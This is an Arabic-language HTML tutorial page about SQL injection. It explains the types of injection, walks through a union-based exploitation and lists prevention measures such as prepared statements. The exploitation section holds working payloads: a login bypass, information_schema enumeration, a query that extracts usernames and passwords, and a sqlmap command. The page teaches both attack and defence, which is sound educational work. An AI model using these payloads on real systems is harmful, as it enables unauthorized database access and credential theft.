<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="file:///D:/UST/web/img/icon.ico" type="image/x-icon">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
    <title>MADAR - ثغرات SQL Injection: الشرح الكامل والاستغلال والحماية</title>
    <style>
        /* CSS Variables for easy theme management */
        :root {
            --bg-color: #000000;
            --primary-color: #7e2eff;
            --primary-glow: #6e44ff;
            --secondary-glow: #a200ff;
            --border-color: #5a14dd;
            --text-color: #e0e0e0;
            --card-bg: #0a0a0a;
            --red-color: #ff4c4c;
            --accent-green: #39ff14;
        }

        /* Basic Setup */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: var(--bg-color);
            background-image:
                linear-gradient(45deg, rgba(125, 55, 255, 0.342) 1px, transparent 1px),
                linear-gradient(-45deg, rgba(157, 71, 255, 0.3) 1px, transparent 1px);
            background-size: 25px 25px;
            background-blend-mode: lighten;
            font-family: 'Tahoma', 'Segoe UI', Arial, sans-serif;
            color: var(--text-color);
            padding-top: 80px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        a {
            text-decoration: none;
            color: inherit;
        }

        /* --- Header & Navigation --- */
        .main-header {
            position: fixed;
            top: 0;
            right: 0;
            width: 100%;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 5%;
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(10px);
            border-bottom: 1px solid var(--border-color);
            z-index: 1000;
            transition: background 0.3s;
        }

        .site-logo {
            font-size: 1.8rem;
            font-weight: bold;
            color: var(--primary-color);
            text-shadow: 0 0 10px var(--primary-glow);
        }

        .site-logo .red {
            color: var(--red-color);
        }

        .main-nav ul {
            list-style: none;
            display: flex;
            gap: 30px;
        }

        .main-nav a {
            font-size: 1.1rem;
            font-weight: 500;
            color: var(--text-color);
            transition: color 0.3s, text-shadow 0.3s;
        }

        .main-nav a:hover, .main-nav a.active {
            color: var(--primary-color);
            text-shadow: 0 0 8px var(--primary-glow);
        }

        #burger-icon {
            display: none;
            font-size: 1.5rem;
            cursor: pointer;
            color: var(--text-color);
            transition: color 0.3s;
        }

        #burger-icon:hover {
            color: var(--primary-color);
        }

        /* --- Main Content --- */
        main {
            flex-grow: 1;
        }

        .container {
            max-width: 1200px;
            margin: 2rem auto;
            padding: 2.5rem;
            border-radius: 12px;
            background-color: rgba(0, 0, 0, 0.85);
            border: 1px solid var(--border-color);
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
        }

        .page-title {
            font-size: 2.5rem;
            color: var(--text-color);
            text-align: center;
            margin-bottom: 1.5rem;
            text-shadow: 0 0 15px var(--primary-glow);
        }

        /* Specific styles for article content */
        .article-content {
            font-size: 1.1rem;
            line-height: 1.9;
            text-align: justify;
            margin-bottom: 2rem;
        }

        .article-content h2 {
            font-size: 2rem;
            color: var(--primary-color);
            margin-top: 2.5rem;
            margin-bottom: 1rem;
            text-shadow: 0 0 10px var(--primary-glow);
            text-align: right; /* لمحاذاة العناوين الفرعية إلى اليمين */
        }

        .article-content h3 {
            font-size: 1.5rem;
            color: var(--accent-green);
            margin-top: 2rem;
            margin-bottom: 0.8rem;
            text-align: right; /* لمحاذاة العناوين الفرعية إلى اليمين */
        }

        .article-content p {
            margin-bottom: 1rem;
        }

        .article-content ul {
            list-style: none; /* إزالة النقاط الافتراضية */
            padding-right: 20px; /* مسافة بادئة للقائمة */
            margin-bottom: 1rem;
        }

        .article-content ul li {
            position: relative;
            margin-bottom: 0.5rem;
            padding-right: 15px; /* مسافة للنقطة المخصصة */
        }

        .article-content ul li::before {
            content: '•'; /* استخدام نقطة مخصصة */
            color: var(--primary-color);
            position: absolute;
            right: 0;
            top: 0;
            font-size: 1.2em;
        }

        .article-content strong {
            color: var(--primary-glow);
        }

        /* Code Block Styling */
        .code-block {
            background-color: #1a1a1a;
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 15px;
            margin: 1.5rem 0;
            overflow-x: auto;
            position: relative;
            font-family: 'Fira Code', 'Cascadia Code', 'Consolas', monospace;
            font-size: 0.95rem;
            line-height: 1.5;
            color: #c9d1d9;
            direction: ltr; /* Ensure LTR for code */
            text-align: left; /* Ensure left-aligned for code */
        }

        .code-block pre {
            margin: 0;
            white-space: pre-wrap; /* Wrap long lines */
            word-wrap: break-word;
        }

        .code-block .copy-btn {
            position: absolute;
            top: 10px;
            left: 10px;
            background-color: var(--primary-color);
            color: white;
            border: none;
            padding: 5px 10px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 0.8rem;
            transition: background-color 0.3s;
        }

        .code-block .copy-btn:hover {
            background-color: var(--primary-glow);
        }

        /* Tables styling */
        .article-content table {
            width: 100%;
            border-collapse: collapse;
            margin: 2rem 0;
            background-color: var(--card-bg);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            overflow: hidden; /* For rounded corners on table */
        }

        .article-content th,
        .article-content td {
            border: 1px solid var(--border-color);
            padding: 12px 15px;
            text-align: right;
        }

        .article-content th {
            background-color: var(--primary-color);
            color: white;
            font-weight: bold;
            font-size: 1.1rem;
        }

        .article-content tr:nth-child(even) {
            background-color: rgba(10, 10, 10, 0.7); /* لون خلفية للأسطر الزوجية */
        }

        .article-content tr:hover {
            background-color: rgba(10, 10, 10, 0.9);
        }

        /* --- Footer --- */
        .main-footer {
            text-align: center;
            padding: 2rem 1rem;
            margin-top: 3rem;
            background-color: rgba(10, 10, 10, 0.5);
            border-top: 1px solid var(--border-color);
            width: 100%;
        }

        .social-links a {
            font-size: 1.5rem;
            margin: 0 15px;
            color: #aaa;
            transition: color 0.3s, transform 0.3s;
        }

        .social-links a:hover {
            color: var(--primary-color);
            transform: scale(1.2);
        }

        .copyright {
            margin-top: 1rem;
            font-size: 0.9rem;
            color: #888;
        }

        /* --- Responsive Design for Mobile --- */
        @media (max-width: 768px) {
            .main-nav {
                position: absolute;
                top: 100%;
                right: 0;
                width: 100%;
                background: rgba(0, 0, 0, 0.95);
                display: none;
                transition: all 0.3s ease-in-out;
            }

            .main-nav.active {
                display: block;
            }

            .main-nav ul {
                flex-direction: column;
                width: 100%;
                text-align: center;
                gap: 0;
            }

            .main-nav ul li {
                border-bottom: 1px solid var(--border-color);
            }

            .main-nav ul li:last-child {
                border-bottom: none;
            }

            .main-nav a {
                display: block;
                padding: 15px;
            }

            #burger-icon {
                display: block;
            }

            .page-title {
                font-size: 2rem;
            }

            .article-content {
                font-size: 1rem;
            }

            .article-content h2 {
                font-size: 1.7rem;
            }

            .article-content h3 {
                font-size: 1.3rem;
            }
        }

        @media (max-width: 480px) {
            .container {
                padding: 1.5rem;
            }

            .page-title {
                font-size: 1.8rem;
            }

            .article-content h2 {
                font-size: 1.5rem;
            }

            .article-content h3 {
                font-size: 1.1rem;
            }
        }
    </style>
</head>
<body>
    <header class="main-header">
        <a href="index.html" class="site-logo">M<span class="red">a</span>dar</a>
        <nav class="main-nav" id="main-nav">
            <ul>
                <li><a href="index.html">Home</a></li>
                <li><a href="Tutorials.html" class="active">Tutorials</a></li>
                <li><a href="tools.html">Tools</a></li>
                <li><a href="about.html">whoami</a></li>
            </ul>
        </nav>
        <div id="burger-icon">
            <i class="fa-solid fa-bars"></i>
        </div>
    </header>

    <main>
        <section class="container">
            <h1 class="page-title">🛡️ ثغرات SQL Injection: الشرح الكامل والاستغلال والحماية</h1>

            <div class="article-content">
                <p><strong>ثغرة SQL Injection (حقن قواعد البيانات)</strong> هي واحدة من أخطر الثغرات الأمنية التي تصيب التطبيقات التي تعتمد على قواعد البيانات. تحدث عندما يتم إدخال أو "حقن" أوامر SQL ضارة داخل مدخلات المستخدم غير المؤمنة، مما يسمح للمهاجم بتنفيذ أوامر مباشرة على قاعدة البيانات.</p>
                <p><strong>مثال سريع:</strong></p>
                <div class="code-block">
                    <pre><code>SELECT * FROM users WHERE username = '$input';</code></pre>
                </div>
                <p>إذا كان الإدخال <code>admin' --</code> فسيصبح:</p>
                <div class="code-block">
                    <pre><code>SELECT * FROM users WHERE username = 'admin' --';</code></pre>
                </div>
                <p>وسيتم تخطي التحقق من كلمة المرور!</p>

                ---
                <h2>🔍 أنواع SQL Injection</h2>
                <h3>1. Classic SQLi (In-band)</h3>
                <ul>
                    <li><strong>Error-based:</strong> يعتمد على رسائل الخطأ من الخادم.</li>
                    <li><strong>Union-based:</strong> يستخدم أمر <code>UNION</code> لدمج نتائج استعلامات إضافية.</li>
                </ul>

                <h3>2. Blind SQLi</h3>
                <p>لا يتم عرض نتائج الاستعلام، ولكن يمكن استنتاجها عبر الاستجابات (نعم/لا).</p>
                <ul>
                    <li><strong>Boolean-based:</strong> يعتمد على العبارات المنطقية.</li>
                    <li><strong>Time-based:</strong> يستخدم تأخير زمني <code>SLEEP()</code> لتحديد ما إذا كان الشرط صحيحًا.</li>
                </ul>

                <h3>3. Out-of-Band SQLi</h3>
                <p>تستخدم قنوات خارجية (مثل DNS أو HTTP) لإرسال النتائج إلى المهاجم. نادرة وتحدث عندما لا يمكن استخدام In-band أو Blind.</p>

                ---
                <h2>🎯 كيفية استغلال SQL Injection</h2>
                <h3>🧪 مثال تطبيقي (Union-based):</h3>
                <p>نفترض هذا الرابط:</p>
                <div class="code-block">
                    <pre><code>https://madar.com/product.php?id=5</code></pre>
                </div>
                <p>نجرب:</p>
                <div class="code-block">
                    <pre><code>?id=5' UNION SELECT null,null--</code></pre>
                </div>
                <p>ثم نزيد الأعمدة حتى لا تظهر أخطاء:</p>
                <div class="code-block">
                    <pre><code>?id=5' UNION SELECT 1,2,3--</code></pre>
                </div>
                <p>إذا ظهرت القيم في الصفحة، نعرف عدد الأعمدة والمواقع المعروضة.</p>
                <p>ثم نحاول كشف أسماء الجداول:</p>
                <div class="code-block">
                    <pre><code>?id=5' UNION SELECT table_name, null, null FROM information_schema.tables--</code></pre>
                </div>
                <p>ثم أعمدة الجدول:</p>
                <div class="code-block">
                    <pre><code>?id=5' UNION SELECT column_name, null, null FROM information_schema.columns WHERE table_name='users'--</code></pre>
                </div>
                <p>ثم نطلب البيانات:</p>
                <div class="code-block">
                    <pre><code>?id=5' UNION SELECT username, password, null FROM users--</code></pre>
                </div>

                ---
                <h2>🛠️ أدوات استغلال SQLi</h2>
                <ul>
                    <li>✅ <strong>sqlmap:</strong> أشهر أداة تلقائية.</li>
                    <div class="code-block">
                        <pre><code>sqlmap -u "http://madar.com/product.php?id=1" --dbs</code></pre>
                    </div>
                    <li>✅ <strong>Burp Suite</strong></li>
                    <li>✅ <strong>Havij</strong> (غير مفتوح المصدر، خطير أمنيًا)</li>
                </ul>

                ---
                <h2>🛡️ كيف نحمي تطبيقاتنا من SQL Injection؟</h2>
                <h3>1. ✅ استخدام الاستعلامات المجهزة (Prepared Statements)</h3>
                <p>مثال بلغة PHP (PDO):</p>
                <div class="code-block">
                    <pre><code>$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
$stmt->execute(['username' => $input]);</code></pre>
                </div>

                <h3>2. ✅ التحقق من مدخلات المستخدم</h3>
                <ul>
                    <li>السماح فقط بالقيم المتوقعة (رقم؟ بريد؟ كلمة؟).</li>
                    <li>استخدام "whitelist" بدلًا من "blacklist".</li>
                </ul>

                <h3>3. ✅ الحد من صلاحيات قاعدة البيانات</h3>
                <p>لا تجعل التطبيق يتصل بقاعدة البيانات بصلاحية root أو admin.</p>

                <h3>4. ✅ إخفاء الأخطاء</h3>
                <p>لا تعرض رسائل الخطأ في الواجهة النهائية للمستخدم.</p>

                <h3>5. ✅ استخدام Web Application Firewall (WAF)</h3>
                <p>مثل ModSecurity أو AWS WAF لحماية التطبيقات من الحقن الشائع.</p>

                <h3>6. ✅ اختبار الأمان بشكل دوري</h3>
                <ul>
                    <li>استخدم أدوات مثل sqlmap و Burp Suite.</li>
                    <li>إجراء فحوصات أمان دورية (Penetration Testing).</li>
                </ul>

                ---
                <h2>⚠️ ملاحظات هامة</h2>
                <ul>
                    <li>ثغرات SQLi قد تؤدي إلى تسريب بيانات حساسة أو حتى السيطرة الكاملة على الخادم.</li>
                    <li>أغلب حوادث الاختراق الكبرى كانت بسبب SQL Injection.</li>
                    <li>معالجة الثغرات في جانب الخادم ضروري؛ لا تعتمد فقط على JavaScript أو التحقق من جانب المستخدم.</li>
                </ul>

                ---
                <h2>📚 مصادر إضافية</h2>
                <ul>
                    <li><a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">OWASP SQL Injection</a></li>
                    <li><a href="https://sqlmap.org" target="_blank">sqlmap official documentation</a></li>
                </ul>
            </div>
        </section>
    </main>

    <footer class="main-footer">
        <div class="social-links">
            <a href="#" aria-label="Twitter"><i class="fab fa-twitter"></i></a>
            <a href="#" aria-label="GitHub"><i class="fab fa-github"></i></a>
            <a href="#" aria-label="LinkedIn"><i class="fab fa-linkedin-in"></i></a>
        </div>
        </footer>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // --- وظيفة قائمة البرجر (Burger Menu) ---
            const burgerIcon = document.getElementById('burger-icon');
            const mainNav = document.getElementById('main-nav');

            if (burgerIcon && mainNav) {
                burgerIcon.addEventListener('click', function() {
                    mainNav.classList.toggle('active');
                    const icon = burgerIcon.querySelector('i');
                    if (mainNav.classList.contains('active')) {
                        icon.classList.remove('fa-bars');
                        icon.classList.add('fa-times');
                    } else {
                        icon.classList.remove('fa-times');
                        icon.classList.add('fa-bars');
                    }
                });

                const navLinks = mainNav.querySelectorAll('a');
                navLinks.forEach(link => {
                    link.addEventListener('click', () => {
                        if (mainNav.classList.contains('active')) {
                            mainNav.classList.remove('active');
                            const icon = burgerIcon.querySelector('i');
                            icon.classList.remove('fa-times');
                            icon.classList.add('fa-bars');
                        }
                    });
                });
            }

            // --- وظيفة زر النسخ (Copy Button) ---
            window.copyCode = function(button) {
                const codeBlock = button.nextElementSibling.querySelector('code');
                const textToCopy = codeBlock.innerText;

                navigator.clipboard.writeText(textToCopy).then(() => {
                    button.textContent = 'تم النسخ!';
                    setTimeout(() => {
                        button.textContent = 'نسخ';
                    }, 2000);
                }).catch(err => {
                    console.error('Failed to copy text: ', err);
                });
            };
        });
    </script>
</body>
</html>
